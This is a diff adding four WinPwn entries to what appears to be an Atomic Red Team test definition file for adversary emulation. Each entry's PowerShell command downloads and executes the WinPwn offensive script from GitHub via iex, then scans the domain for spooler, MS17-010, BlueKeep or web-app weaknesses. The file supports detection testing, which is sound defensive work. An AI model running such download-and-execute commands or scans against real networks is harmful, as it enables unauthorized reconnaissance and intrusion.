@@ -120,3 +120,47 @@ atomic_tests:
     command: |
       python #{filename} -i #{host_ip}
     name: powershell
+- name: WinPwn - spoolvulnscan
+  auto_generated_guid: 54574908-f1de-4356-9021-8053dd57439a
+  description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      spoolvulnscan -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - MS17-10
+  auto_generated_guid: 97585b04-5be2-40e9-8c31-82157b8af2d6
+  description: Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      MS17-10 -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - bluekeep
+  auto_generated_guid: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
+  description: Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      bluekeep -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - fruit
+  auto_generated_guid: bb037826-cbe8-4a41-93ea-b94059d6bb98
+  description: Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      fruit -noninteractive -consoleoutput
+    name: powershell
